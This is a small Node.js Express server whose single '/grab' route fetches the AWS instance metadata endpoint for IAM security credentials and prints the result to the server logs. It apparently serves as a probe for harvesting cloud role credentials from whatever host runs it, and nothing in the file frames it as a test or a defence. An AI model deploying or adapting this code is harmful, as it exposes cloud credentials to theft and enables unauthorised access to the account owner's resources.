const express = require('express');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 10000;

app.get('/grab', async (req, res) => {
  const sensitiveUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';

  try {
    const response = await fetch(sensitiveUrl);
    const text = await response.text();

    console.log("=== METADATA ===");
    console.log(text); // اسم الـ IAM Role

    res.send("✅ Done: Check logs for metadata.");
  } catch (error) {
    console.error("❌ Failed to fetch metadata:", error);
    res.status(500).send("Error fetching metadata");
  }
});

app.listen(port, () => {
  console.log(`🔥 Server running on port ${port}`);
});
